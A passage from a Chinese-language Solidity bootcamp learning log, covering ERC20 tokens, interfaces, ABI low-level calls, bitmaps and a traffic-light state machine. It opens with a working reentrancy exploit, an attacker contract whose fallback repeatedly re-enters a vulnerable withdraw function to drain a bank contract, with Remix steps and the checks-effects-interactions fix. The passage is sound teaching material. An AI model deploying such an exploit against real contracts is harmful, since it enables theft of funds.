        uint256 bal = balances[msg.sender];
        require(bal > 0);

        // [漏洞点]：先给钱 (Interaction)
        // 这一步会触发接收方的 fallback/receive 函数
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        // [漏洞点]：后扣款 (Effect)
        // 攻击者会在上一行代码执行时，利用“递归”再次冲进这个函数
        // 此时这行代码还没执行，balances 还没变！
        balances[msg.sender] = 0;
    }

    // 查看银行总余额
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// --- 2. 攻击者合约 (Hacker) ---
contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // 攻击入口
    function attack() external payable {
        require(msg.value >= 1 ether);
        // 1. 先存钱，把自己伪装成正常储户
        etherStore.deposit{value: 1 ether}();
        // 2. 发起提款，触发连环陷阱
        etherStore.withdraw();
    }

    // [关键]：类似中断服务函数 (ISR)
    // 当收到 ETH 时自动触发
    fallback() external payable {
        // 检查银行还有没有钱
        if (address(etherStore).balance >= 1 ether) {
            // [递归调用]：趁余额还没扣，再取一次！
            etherStore.withdraw();
        }
    }

    // 查看赃款
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

* * *

3\. 攻击步骤 (请严格按顺序操作)

**环境准备：** 使用 `Remix VM (Cancun)`。

**步骤 1：部署受害者 (EtherStore)**

1.  部署 `EtherStore`。
    
2.  **给银行充值（扮演无辜群众）：**
    
    -   在左侧 **Value** 栏输入 `5`，单位选 `Ether`。
        
    -   点击 `deposit`。
        
    -   _此时银行里有 5 ETH（包含了你存的）。_
        

**步骤 2：部署攻击者 (Attack)**

1.  复制 `EtherStore` 的地址。
    
2.  在 `Attack` 的部署栏填入该地址，点击 Deploy。
    

**步骤 3：发起攻击 (Attack)**

1.  展开 `Attack` 合约。
    
2.  在左侧 **Value** 栏输入 `1`，单位选 `Ether`（这是攻击者的本金）。
    
3.  点击 `attack` 按钮（红色按钮）。
    

**步骤 4：查看战果**

1.  查看 `EtherStore` 的 `getBalance` -> **应该是** `0` (被掏空了)。
    
2.  查看 `Attack` 的 `getBalance` -> **应该是** `6` **ETH** (本金 1 + 抢来的 5)。
    

* * *

4\. 修复方案：Checks-Effects-Interactions

还记得我们在 **第 4 天** 讲的那个铁律吗？现在你知道为什么它这么重要了。

**嵌入式修复逻辑：** 就像在 ISR 中处理共享变量一样：**先更新状态标志位，再执行耗时操作。**

**请修改** `withdraw` **函数为安全版本：**

Solidity

```
function withdrawSafe() public {
    uint256 bal = balances[msg.sender];
    require(bal > 0);

    // [修复]：先扣款 (Effect)
    // 就算黑客再次重入，进来一查 balances 已经是 0 了
    balances[msg.sender] = 0;

    // [修复]：后给钱 (Interaction)
    (bool sent, ) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");
}
```

* * *

![屏幕截图 2026-01-23 160531.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-23-1769156734535-_____2026-01-23_160531.png)![屏幕截图 2026-01-23 160256.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-23-1769156719588-_____2026-01-23_160256.png)

### 今日任务

1.  **成功复现攻击**：这一步非常爽，亲眼看到银行余额归零。请截图 `EtherStore` 余额为 0 的画面 。
    
2.  **修复并测试**：把 `EtherStore` 代码换成 `withdrawSafe`，重新部署，再次尝试攻击。这次攻击应该会失败（或者只能取出本金，无法盗取额外资金）。
    

**做完这个，你就真正理解了为什么智能合约开发被称为“在刀尖上跳舞”！**
<!-- DAILY_CHECKIN_2026-01-23_END -->

# 2026-01-22
<!-- DAILY_CHECKIN_2026-01-22_START -->

















# 第11天：代币标准 (ERC20) —— 发行“数字货币”

今天我们要把技能变现。我们要学习 **ERC20 标准**。

在区块链世界，发币（Token）听起来很神秘，但对于嵌入式工程师来说，它其实就是**实现了一个特定的接口标准**。

## 1\. 理论映射：标准协议栈 (USB HID vs ERC20)

| 概念 | 嵌入式 USB 设备 | 区块链 ERC20 代币 |
| 本质 | 遵循 USB HID 标准的固件 | 遵循 ERC20 接口的智能合约 |
| 兼容性 | 只要符合 HID 标准，插到任何电脑（Windows/Mac/Linux）都能识别为鼠标/键盘，无需驱动。 | 只要符合 ERC20 标准，任何钱包（MetaMask）或交易所都能识别并显示您的余额，无需适配。 |
| 开发方式 | 不推荐从零写 USB 协议栈（容易出错）。推荐使用厂商库（STM32 HAL / TinyUSB）。 | 不推荐从零写代币逻辑（容易有漏洞）。推荐使用标准库（OpenZeppelin）。 |

**核心逻辑：**

ERC20 代币本质上就是一个 Excel 表格（Mapping）：

`mapping(address => uint256) balances;`

所有的转账（Transfer），就是在这个表里把 A 的数字减小，把 B 的数字增大。

* * *

## 2\. 工具准备：引入 OpenZeppelin (HAL 库)

我们不需要自己写 `transfer` 函数的加减法（因为要处理溢出、安全检查等繁琐细节），我们直接用 **OpenZeppelin**。这就像我们在 STM32 开发中直接引用 `#include "stm32f1xx_hal.h"`。

3\. 代码实战：发行 "IoT Reward Token"

我们将发行一个名为 **"IoT Reward" (IOTR)** 的代币，用于奖励那些上传传感器数据的设备。

请在 Remix 中新建 `Day11_Token.sol`：

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 1. 引入标准库 (相当于 #include "HAL_Driver.h")
// Remix 会自动从 GitHub 下载这个文件
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// 2. 继承 ERC20 功能
contract IoTReward is ERC20 {
    
    // 构造函数：初始化代币名字和代号
    constructor() ERC20("IoT Reward Token", "IOTR") {
        // 3. "铸造" (Mint) 代币
        // 就像出厂设置时初始化计数器
        // 1000 * 10**18 代表 1000 个币 (因为以太坊默认 18 位小数)
        // msg.sender 是您自己，意思是把这 1000 个币初始分配给管理员
        _mint(msg.sender, 1000 * 10**18);
    }

    // 模拟一个只有管理员能调用的发奖函数
    function rewardDevice(address _device, uint256 _amount) public {
        // 在真实项目中这里应该加 onlyOwner 权限控制
        // 铸造新的币给设备
        _mint(_device, _amount);
    }
}
```

* * *

## 4\. 实验步骤

**步骤 1：部署合约**

1.  编译代码（第一次可能比较慢，因为要下载库文件）。
    
2.  部署 `IoTReward`。
    

**步骤 2：查看余额**

1.  展开合约，找到 `balanceOf` 函数。
    
2.  输入您的地址（Account 栏里的那个地址）。
    
3.  点击 call。
    
    -   **预期结果：** 一个巨大的数字 `1000000000000000000000`。
        
    -   _解释：_ 这就是 `1000` 个币。因为 Solidity 不支持小数，所以我们用 `10^18` 作为最小单位（Wei）。这就像我们在 MCU 里用 `mV` (毫伏) 存电压，而不是 `V`。
        

**步骤 3：转账测试 (Transfer)**

1.  找到 `transfer` 函数。
    
2.  **To:** 复制 Account 下拉菜单里的**第二个地址**。
    
3.  **Amount:** 输入 `1000000000000000000` (即 1 个币，1 后面 18 个 0)。
    
4.  点击 transact。
    

**步骤 4：验证转账**

1.  再次用 `balanceOf` 查第二个地址的余额。
    
    -   应该显示 `1000000000000000000`。
        
2.  查第一个地址（您自己）的余额。
    
    -   应该变成了 `999000...`。
        
        ![屏幕截图 2026-01-22 175839.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-22-1769088003769-_____2026-01-22_175839.png)

![屏幕截图 2026-01-22 175932.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-22-1769088029264-_____2026-01-22_175932.png)![屏幕截图 2026-01-21 120047.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-22-1769087972007-_____2026-01-21_120047.png)

### 深度思考 (嵌入式视角)

做完实验后，请思考这个场景：

在很多嵌入式系统中，CPU 对外设的访问需要“授权”。

在 ERC20 中，有一个 `approve` **(授权)** 和 `transferFrom` **(代转)** 机制。

它的作用是：**我（用户）授权给 一个智能合约（比如自动售货机），允许它从我的钱包里扣款 50 块钱。**

这就像您在 STM32 中开启 DMA 通信：

1.  **CPU (用户):** 配置 DMA 控制器，允许它访问 RAM 的某块区域（Approve）。
    
2.  **DMA (合约):** 在数据到来时，自动搬运数据，不需要 CPU 再次干预（TransferFrom）。
<!-- DAILY_CHECKIN_2026-01-22_END -->

# 2026-01-21
<!-- DAILY_CHECKIN_2026-01-21_START -->


















# 第10天：接口 (Interface) 与 继承 (Inheritance)

## 1\. 理论映射：头文件与驱动层

| C 语言 | Solidity | 作用 |
| .h 头文件 | interface | 只定义函数原型（名字、参数、返回值），不写实现。告诉编译器“对方有哪些功能码”。 |
| #include | import | 引入外部代码。 |
| struct 继承/组合 | contract A is B | 子合约自动拥有父合约的所有变量和函数。 |
| virtual / override | virtual / override | 允许子类重写父类的逻辑（多态）。 |

* * *

## 2\. 代码实战：构建“农业传感器网络”

我们要模拟一个场景：

1.  **定义标准：** 所有传感器（无论是温度还是湿度）都必须遵守一个接口标准 `ISensor`。
    
2.  **具体实现：** 编写 `TemperatureSensor` 实现该接口。
    
3.  **中央控制：** 编写 `CentralHub`，它可以统一管理任何遵守 `ISensor` 标准的设备。
    

请在 Remix 中新建 `Day10_Interface.sol`：

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// --- 1. 定义接口 (相当于 .h 头文件) ---
// 规定所有传感器必须具备读取 value 的能力
interface ISensor {
    // 接口函数只有声明，没有实现 (没有 {})
    function getValue() external view returns (uint256);
}

// --- 2. 具体传感器实现 (相当于 .c 驱动文件) ---
contract TemperatureSensor is ISensor {
    uint256 public temp;
    
    constructor(uint256 _startTemp) {
        temp = _startTemp;
    }

    function setTemp(uint256 _t) public {
        temp = _t;
    }

    // 必须实现接口定义的函数，并加上 override 关键字
    function getValue() external view override returns (uint256) {
        return temp;
    }
}

// --- 3. 中央控制器 (主控 MCU) ---
contract CentralHub {
    
    // 这里的参数类型是接口 ISensor，而不是具体的合约地址
    // 这意味着它可以接收任何实现了 ISensor 的合约
    function readSensor(ISensor _sensorAddress) public view returns (uint256) {
        // 编译器会自动生成底层的 call 指令
        // 相当于: _sensorAddress.call(abi.encodeWithSignature("getValue()"))
        return _sensorAddress.getValue();
    }
    
    // 进阶：批量读取多个传感器
    function readAll(ISensor[] memory _sensors) public view returns (uint256[] memory) {
        uint256[] memory results = new uint256[](_sensors.length);
        for(uint i=0; i<_sensors.length; i++) {
            results[i] = _sensors[i].getValue();
        }
        return results;
    }
}
```

* * *

## 3\. 实验步骤

**步骤 1：部署传感器**

1.  选择 `TemperatureSensor` 合约。
    
2.  在 Deploy 按钮旁的输入框填入初始温度（例如 `2500`）。
    
3.  点击 Deploy。
    
4.  **复制** 这个新传感器的地址（我们叫它 `Sensor_A`）。
    

**步骤 2：部署第二个传感器（可选）**

1.  再次修改参数（例如 `3000`），部署另一个 `TemperatureSensor`。
    
2.  **复制** 地址（叫它 `Sensor_B`）。
    

**步骤 3：部署主控**

1.  选择 `CentralHub` 合约，Deploy。
    

**步骤 4：测试接口调用**

1.  在 `CentralHub` 中找到 `readSensor` 函数。
    
2.  粘贴 `Sensor_A` 的地址。
    
3.  点击 call。
    
    -   **预期结果：** 返回 `2500`。
        
4.  _(进阶)_ 在 `readAll` 函数中，输入数组格式：`["Sensor_A地址", "Sensor_B地址"]`（注意要用英文双引号包裹地址）。
    
    -   **预期结果：** 返回 `2500, 3000`。
        

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-21-1768982014447-image.png)

* * *

### 🧠 深度思考

做完实验后，请思考：

CentralHub 代码里根本不知道 TemperatureSensor 的存在，它只知道 ISensor。

如果我明天写了一个 HumiditySensor（湿度传感器），也实现了 ISensor 接口。我需要修改 CentralHub 的代码吗？

_（答案是不需要。这就是“面向接口编程”的威力，也是 DeFi 积木（如 Uniswap, Aave）能无限组合的基础。）_
<!-- DAILY_CHECKIN_2026-01-21_END -->

# 2026-01-20
<!-- DAILY_CHECKIN_2026-01-20_START -->



















# 第9天：ABI 编码与低级调用 —— 手搓通信协议

## 1\. 理论映射：以太坊的“通信帧”格式

当你发起一笔交易时，数据区（Input Data）其实就是一段字节流。它的结构非常简单，只有两部分：

| 字段 | 长度 | 嵌入式类比 | 作用 |
| 函数选择器 (Selector) | 4 字节 | 功能码 (Function Code) | 告诉合约你想调用哪个函数。 |
| 参数编码 (Encoded Args) | N * 32 字节 | 数据载荷 (Payload) | 函数的具体参数，按 32 字节对齐填充。 |

-   **怎么生成功能码？**
    
    -   比如函数签名是 `setVal(uint256)`。
        
    -   计算它的哈希：`keccak256("setVal(uint256)")`。
        
    -   取前 4 个字节。
        

* * *

## 2\. 代码实战：手动组包发送 (Low-level Call)

我们要写两个合约：

1.  **Target (接收端):** 一个普通的合约，假装它是一个远程传感器。
    
2.  **Hacker (发送端):** 不使用正常的函数调用，而是**手动构建二进制包**去“攻击/调用”接收端。
    

请在 Remix 中新建 `Day9_LowLevel.sol`：

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 1. 目标合约 (服务端)
contract Target {
    uint256 public data;
    address public sender;

    // 我们要调用的目标函数
    function setData(uint256 _data) public {
        data = _data;
        sender = msg.sender; // 记录是谁调用的
    }
}

// 2. 攻击者合约 (客户端 - 手动组包)
contract Hacker {
    
    // 方法 A: 正常调用 (编译器帮你打包)
    function callNormal(address _target, uint256 _val) public {
        Target(_target).setData(_val);
    }

    // 方法 B: 低级调用 (手搓数据帧 - 重点！)
    function callLowLevel(address _target, uint256 _val) public {
        
        // --- 第一步：手动构建 Payload ---
        // 类似于: uint8_t buffer[36];
        // memcpy(buffer, selector, 4);
        // memcpy(buffer+4, data, 32);
        
        // abi.encodeWithSignature 会自动计算哈希前4字节并拼接参数
        bytes memory payload = abi.encodeWithSignature("setData(uint256)", _val);

        // --- 第二步：发送裸数据包 ---
        // 类似于: HAL_UART_Transmit(&huart1, payload, len, timeout);
        // .call 返回两个值: success (bool) 和 returnData (bytes)
        (bool success, ) = _target.call(payload);

        require(success, "Call failed!");
    }
}
```

* * *

3\. 实验步骤 (请严格执行)

**步骤 1：部署 Target**

1.  部署 `Target` 合约。
    
2.  复制它的地址（点击 Copy 图标）。
    

**步骤 2：部署 Hacker**

1.  部署 `Hacker` 合约。
    

**步骤 3：正常调用测试 (基准组)**

1.  在 `Hacker` 的 `callNormal` 中，输入 Target 地址和数字 `123`。
    
2.  点击 transact。
    
3.  去 `Target` 检查 `data`，应该是 `123`。
    
4.  **关键观察：** 在控制台查看这笔交易的 `Input` 字段。
    
    -   它看起来像 `0x` + `功能码` + `...00007b` (123的十六进制)。
        

**步骤 4：低级调用测试 (实验组)**

1.  在 `Hacker` 的 `callLowLevel` 中，输入 Target 地址和数字 `999`。
    
2.  点击 transact。
    
3.  去 `Target` 检查 `data`。如果变成了 `999`，说明你**手动组装的数据包**被对方成功解析了！
    

* * *

![屏幕截图 2026-01-20 130639.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-20-1768887131070-_____2026-01-20_130639.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-20-1768887153864-image.png)

## 4\. 深度思考 (调试视角)

我在代码里写的是 abi.encodeWithSignature("setData(uint256)", \_val)。

如果不小心多打了一个空格，写成了 "setData(uint256 )"，会发生什么？

-   _回答：这会改变字符串的哈希值，导致生成的“功能码”完全改变。Target 合约收到后，发现匹配不到任何函数，就会报错（或进入 fallback 函数）。这就像 MODBUS 发错了功能码，从机不响应。_
<!-- DAILY_CHECKIN_2026-01-20_END -->

# 2026-01-19
<!-- DAILY_CHECKIN_2026-01-19_START -->




















# 第8天：位图 (Bitmap) 与 存储压缩

在嵌入式开发中，寄存器操作是家常便饭：

GPIOA->ODR |= (1 << 5); // 将第5位拉高

在 Solidity 中，这种“抠抠索索”的操作不仅是为了节省内存，更是为了**省钱**。因为你已经知道，`SSTORE`（写 Flash）是整个以太坊最贵的操作（20,000 Gas）。

## 1\. 理论映射：Storage Slot (存储槽) = 32位寄存器？

-   **STM32:** 内存地址通常以 4 字节（32位）对齐。
    
-   **EVM:** 存储槽（Slot）是 **32 字节（256位）** 对齐的。
    

巨大的浪费陷阱：

如果你定义了 bool isCompleted\[256\]：

-   **C语言:** 编译器可能会优化，或者占 256 字节。
    
-   **Solidity:** 默认情况下，数组的每个元素都会占用一个新的 Slot（或者大部分）。
    
-   **成本:** 如果你要初始化这 256 个布尔值，你可能需要支付 **256 x 20,000 Gas**。这是天文数字！
    

### 位图方案 (Bitmap):

如果我们用一个 uint256 变量来代表 256 个开关：

-   **成本:** 只需要支付 **1 x 20,000 Gas**。
    
-   **效率:** 提升了 **256倍**。
    

这完全就是你熟悉的 **位掩码 (Bitmask)** 技术。

* * *

## 2\. 代码实战：编写 `BitMap` 合约

我们要实现一个签到系统。如果是 Web2 开发者，可能会写一个 mapping 存每天的签到状态。但作为嵌入式工程师，我们要用**一个整数存下一整年的签到记录**。

请在 Remix 中新建 `Day8_Bitmap.sol`：

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BitmapRegister {
    // 这里的 bits 就是我们的 "256位 寄存器"
    // 它可以存储 256 个 boolean 状态
    uint256 public bits;

    // 1. 置位 (SET BIT) - 相当于 GPIO_BSRR
    function checkIn(uint8 index) public {
        require(index < 256, "Index overflow");
        
        // 逻辑: bits = bits | (1 << index)
        // 注意: 1 需要显式转为 uint256，防止移位溢出
        uint256 mask = uint256(1) << index;
        bits = bits | mask;
    }

    // 2. 复位 (CLEAR BIT) - 相当于 GPIO_BRR
    function cancelCheckIn(uint8 index) public {
        require(index < 256, "Index overflow");

        // 逻辑: bits = bits & ~(1 << index)
        uint256 mask = ~(uint256(1) << index);
        bits = bits & mask;
    }

    // 3. 读位 (READ BIT) - 相当于 (IDR & mask)
    function isCheckedIn(uint8 index) public view returns (bool) {
        require(index < 256, "Index overflow");

        uint256 mask = uint256(1) << index;
        return (bits & mask) != 0;
    }

    // --- 高级功能：一次性获取所有签到状态 ---
    // 直接返回这个大整数，前端去解析每一位
    function getAllBits() public view returns (uint256) {
        return bits;
    }
}
```

* * *

## 3\. 实验验证

1.  **部署** `BitmapRegister`。
    
2.  **查看初始状态:** 点击 `bits`，应为 `0`。
    
3.  **签到 (SET):**
    
    -   调用 `checkIn(0)`。
        
    -   查看 `bits` -> 变成 `1` (二进制 `...001`)。
        
4.  **再次签到 (SET):**
    
    -   调用 `checkIn(1)`。
        
    -   查看 `bits` -> 变成 `3` (二进制 `...011`)。
        
5.  **跳跃签到:**
    
    -   调用 `checkIn(8)`。
        
    -   查看 `bits` -> 变成 `259` (二进制 `...100000011`)。即 $2^8 + 2^1 + 2^0 = 256 + 2 + 1 = 259$。
        
6.  **取消签到 (CLEAR):**
    
    -   调用 `cancelCheckIn(0)`。
        
    -   查看 `bits` -> 变成 `258`。
        

Gas 观察：

查看控制台，这些操作的 Gas 消耗极低（除了第一次从0变1比较贵，后续的修改都非常便宜，因为 Slot 已经被“预热”且非零）。

![屏幕截图 2026-01-19 230829.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-19-1768836904061-_____2026-01-19_230829.png)![屏幕截图 2026-01-19 230931.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-19-1768836947512-_____2026-01-19_230931.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-19-1768836892131-image.png)

* * *

## 4\. 进阶理论：变量打包 (Variable Packing)

除了手动位操作，Solidity 编译器也会自动帮我们做“结构体对齐/打包”。

**请看这组对比：**

**方案 A (糟糕的布局):**

Solidity

```
struct BadLayout {
    uint8 a;     // 1 byte
    uint256 b;   // 32 bytes (必须开新槽，因为 Slot 只有 32 bytes)
    uint8 c;     // 1 byte (又开新槽)
}
// 结果：占用 3 个 Slots (96 bytes) -> 3倍存储成本
```

**方案 B (优秀的布局 - 嵌入式思维):**

Solidity

```
struct GoodLayout {
    uint8 a;     // 1 byte
    uint8 c;     // 1 byte (紧凑排列，塞进同一个 Slot)
    // 此时 Slot 1 还剩 30 bytes
    uint256 b;   // 32 bytes (Slot 1 放不下了，开 Slot 2)
}
// 结果：占用 2 个 Slots -> 省钱！
```

**更优方案 C:**

Solidity

```
struct BestLayout {
    uint128 a;   // 16 bytes
    uint128 b;   // 16 bytes
}
// 结果：正好 32 bytes，占用 1 个 Slot。
```

* * *

5\. 今日作业

为了巩固“位操作”和“打包”的概念，请你完成以下任务：

任务：

编写一个新的合约 PackedSwitch。

1.  定义一个结构体：
    
    Solidity
    
    ```
    struct Config {
        uint64 startTime; // 8 bytes
        uint64 endTime;   // 8 bytes
        uint8 mode;       // 1 byte
        bool isActive;    // 1 byte
    }
    ```
    
2.  声明一个 `Config` 类型的公开变量 `sysConfig`。
    
3.  写一个函数 `updateConfig` 一次性更新所有字段。
    

思考题：

在这个结构体中，所有字段加起来一共用了多少字节？它们会被存放在 1 个 Slot 里，还是 2 个？

(提示：$8+8+1+1 = 18$ 字节，小于 32 字节)
<!-- DAILY_CHECKIN_2026-01-19_END -->

# 2026-01-18
<!-- DAILY_CHECKIN_2026-01-18_START -->





















# 第7天：第一周实战——“红绿灯”状态机系统

今天没有新语法，只有实战。

我们将把过去 6 天学到的所有积木（枚举、时间戳、事件、逻辑控制）组合起来，构建一个带有时间控制的交通信号灯系统。

这对于嵌入式工程师来说是“送分题”，因为**状态机 (FSM)** 是你的本能。但在区块链上，我们要面对一个新对手：**时间欺骗**。

## 1\. 项目需求规格书 (Spec)

请构建一个合约 `TrafficLight`，满足以下嵌入式逻辑：

1.  **状态定义：** 系统只有三种状态：`Red`, `Green`, `Yellow`。
    
2.  **初始状态：** 上电（部署）时默认为 `Red`。
    
3.  **流转规则 (硬逻辑)：**
    
    -   🔴 Red ——> 🟢 Green
        
    -   🟢 Green ——> 🟡 Yellow
        
    -   🟡 Yellow ——> 🔴 Red
        
    -   _禁止任何其他跳转（比如红灯不能直接变黄灯）。_
        
4.  **时间控制 (软逻辑)：**
    
    -   为了安全，红灯必须至少亮 1 分钟（60秒）才能切换。
        
    -   绿灯至少 1 分钟。
        
    -   黄灯至少 5 秒。
        
    -   _如果在倒计时结束前尝试切换，必须报错。_
        
5.  **输出信号：** 每次切换，发射事件 `LightChanged(NewState, Timestamp)`。
    

* * *

## 2\. 代码实战：填空题

为了测试你的掌握程度，我提供一个**代码骨架**。请在 Remix 中新建 `Day7_TrafficLight.sol`，并尝试**填补** `TODO` **部分的代码**。

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TrafficLight {
    
    // 1. 定义枚举 (状态机)
    enum State { Red, Green, Yellow }
    State public currentState;

    // 2. 记录上一次切换的时间 (类似于 systick)
    uint256 public lastChangeTime;

    // 3. 定义事件 (中断信号)
    event LightChanged(State newState, uint256 timestamp);

    constructor() {
        currentState = State.Red;
        lastChangeTime = block.timestamp; // 记录上电时间
    }

    // 核心函数：切换到下一个状态
    // 不需要输入参数，因为状态流转是确定的 (Red->Green->Yellow->Red)
    function nextState() public {
        
        // --- TODO 1: 计算距离上次切换过去了多久 ---
        // 提示: 用 block.timestamp 减去 lastChangeTime
        uint256 timeElapsed = ____________________;

        // --- TODO 2: 实现状态机流转逻辑 ---
        if (currentState == State.Red) {
            // 红灯逻辑：检查是否满 60 秒
            require(timeElapsed >= 60, "Red light: Wait more time!");
            // 切换状态
            currentState = State.Green;
        } 
        else if (currentState == State.Green) {
            // 绿灯逻辑：检查是否满 60 秒
            // ____________________ (请补全检查)
            
            // 切换状态
            // ____________________ (请补全赋值: 绿 -> 黄)
        } 
        else if (currentState == State.Yellow) {
            // 黄灯逻辑：检查是否满 5 秒
            require(timeElapsed >= 5, "Yellow light: Too fast!");
            
            // 切换状态
            currentState = State.Red;
        }

        // --- TODO 3: 更新时间戳 ---
        // 类似于重置定时器计数器
        lastChangeTime = ____________________;

        // --- TODO 4: 发射事件 ---
        emit LightChanged(currentState, block.timestamp);
    }
}
```

* * *

## 3\. 你的任务

1.  **补全代码：** 将上述代码在 Remix 中补全。
    
2.  **部署测试：**
    
    -   部署合约。
        
    -   **立即点击** `nextState`。
        
        -   _预期结果：_ 应该报错！因为刚部署（Red），时间没过 60 秒。
            
        -   _报错内容：_ "Red light: Wait more time!"
            
    -   **作弊测试 (修改代码)：** 为了方便测试，你可以把 `60` 改成 `5` 秒。
        
    -   **等待 5 秒后点击** `nextState`。
        
        -   _预期结果：_ 交易成功，状态变为 `Green`。
            

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-18-1768744538522-image.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-18-1768744525665-image.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-18-1768744557269-image.png)

### 思考题（面试考点）：

在嵌入式里，我们可以用 delay(1000) 让 CPU 暂停。在 Solidity 智能合约里，如果我写一个 while 循环空跑来延时，可行吗？为什么？

答：

不能，下面会解释一下运行模式，从一个比较底层的方面去帮助你理解

### 嵌入式 vs 区块链的运行模式

-   **嵌入式 (Active Mode):**
    
    -   代码：`void main() { while(1) { Task(); } }`
        
    -   CPU：一直跑，没事干就空转（Idle Task）。
        
    -   控制权：**在你手里**。你可以随时调用 `delay()` 让 CPU 停下来等一等。
        
-   **智能合约 (Passive Mode):**
    
    -   代码：**平时静止**，躺在硬盘（全网节点的数据库）里。
        
    -   触发：**只有当“交易”发生时**，EVM 才会把你的合约加载到内存里执行。
        

### **总结一下：**

-   入口：**EVM 并没有调用** `main()`**，而是调用了一个隐藏的“分发器” (Dispatcher)。入口：** Solidity 没有 `main()`，它通过 **Function Selector**（类似于 Modbus 功能码）进行中断分发。
    
-   **运行方式：** 它是被动的，只有交易来了才运行，运行完立刻销毁内存（Memory），只保留状态（Storage）。
    
-   **不能 Delay：** 因为 **Gas 太贵（看门狗会复位）** 且 **不能阻塞全球共识**。
    

如果你能学到这里，恭喜你掌握了最基本的Solidity语法，第二周我们将深入研究如何像操作寄存器一样操作这些二进制数据。
<!-- DAILY_CHECKIN_2026-01-18_END -->

# 2026-01-17
<!-- DAILY_CHECKIN_2026-01-17_START -->






















# 第6天：高级数据结构 —— 突破 Mapping 的限制

今天是周六，大家这一周过的怎么样呢？今天先做些简单的任务吧，但不管如何，请你把我给出的示例代码中的每个点都理解一下，并且最好可以自己手打一遍，以加深对Solidity合约的理解，接下来，和我进入学习的世界吧。

我们之前提到过，`mapping` 是一个巨大的哈希表，它有一个致命的弱点：**无法遍历**。 你不能写 `for (i=0; i<mapping.length; i++)`。这对于习惯了 C 语言数组遍历的工程师来说极其难受。

今天我们的目标是：**构建一个“可遍历”的存储系统**。

## 1\. 理论映射：链表 vs 索引数组

在嵌入式文件系统（如 FATFS 或 SPIFFS）中，如果你想列出所有文件，系统通常维护了一个文件分配表（FAT）或者目录项列表。

在 Solidity 中，为了实现“列出所有传感器”的功能，我们通常采用 **Mapping + Array** 的组合模式 ：

-   **Mapping:** 用于**随机访问**（O(1) 复杂度，通过 ID 查数据）。
    
-   **Array:** 用于**记录索引**（存储所有的 ID，方便遍历）。
    

## 2\. 代码实战：`SensorRegistry`

请在 Remix 中新建 `Day6_IterableMapping.sol`。我们要实现一个注册表，既能查单个，又能查所有。

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SensorRegistry {
    
    struct SensorInfo {
        uint256 id;
        string location; // 安装位置，如 "Factory_A"
        bool isRegistered; // 防止重复注册的标志位
    }

    // 1. 核心存储：ID -> 详细信息 (类似于 Flash 里的数据区)
    mapping(uint256 => SensorInfo) public sensors;

    // 2. 索引数组：存储所有已注册的 ID (类似于文件系统的目录表)
    uint256[] public sensorIds;

    // 事件
    event SensorRegistered(uint256 id, string location);

    // 注册新传感器
    function registerSensor(uint256 _id, string memory _location) public {
        // [Check] 检查 ID 是否已存在 (利用 mapping 的 O(1) 查找优势)
        require(!sensors[_id].isRegistered, "ID already exists!");

        // [Effect 1] 存入详细数据
        sensors[_id] = SensorInfo(_id, _location, true);

        // [Effect 2] 记录 ID 到数组 (为了以后能遍历)
        sensorIds.push(_id);

        // [Interaction]
        emit SensorRegistered(_id, _location);
    }

    // 获取传感器总数
    function getSensorCount() public view returns (uint256) {
        return sensorIds.length;
    }

    // --- 核心功能：获取所有传感器 ID ---
    // 注意：如果数组太大，这个函数可能会因为 Gas 超限而无法被合约内部调用，
    // 但外部前端调用是免费的。
    function getAllSensorIds() public view returns (uint256[] memory) {
        return sensorIds;
    }
}
```

## 3\. 实验任务

请按照以下步骤操作，体验“组合数据结构”的威力：

1.  **部署** `SensorRegistry`。
    
2.  **注册三个传感器：**
    
    -   `registerSensor(101, "Lab_1")`
        
    -   `registerSensor(102, "Greenhouse")`
        
    -   `registerSensor(103, "PumpStation")`
        
3.  **尝试重复注册：**
    
    -   再次输入 `101`，点击交易。观察是否报错（验证 `mapping` 的查重能力）。
        
4.  **遍历查询（关键）：**
    
    -   点击 `getAllSensorIds` 按钮。
        
